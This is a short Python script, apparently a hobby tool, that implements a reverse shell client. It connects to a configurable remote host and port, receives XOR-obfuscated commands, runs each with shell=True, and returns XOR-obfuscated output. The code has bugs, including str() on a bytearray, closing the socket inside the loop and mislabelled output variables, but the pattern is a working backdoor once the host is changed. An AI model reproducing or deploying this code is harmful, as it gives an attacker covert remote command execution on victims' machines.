import socket
import argparse
import subprocess
import pyfiglet
import os
"""This is the driver code"""
def main():
    os.system('tput clear')
    f=pyfiglet.Figlet(font='cybermedium')
    print(f.renderText('Reverse Shell'))
    print ('\033[1m')
    print("Simplifies command execution on a system with reverse shell access")
    print ('\033[0m')
    # Configuring the script to connect to the remote culprit system
    RHOST='localhost'
    RPORT=8000
    # Establihing connection with the remote system
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    # Receiving commands from the remote system
    while True:
        data=s.recv(1024)
        command=bytearray(data)
        #  Decoding the command received
        for i in range(len(command)):
            command[i]=command[i]^0x41
        # Executing the output using the subprocess lib
        comm=subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        STDOUT, STDIN=comm.communicate()

        # Encoding the result to be sent over the socket
        res=bytearray(STDOUT)
        for i in range(len(res)):
            res[i]^=0x41
        # Sending the encoded data over the sockets
        s.send(str(res))
        s.close()

if __name__ == '__main__':
    main()
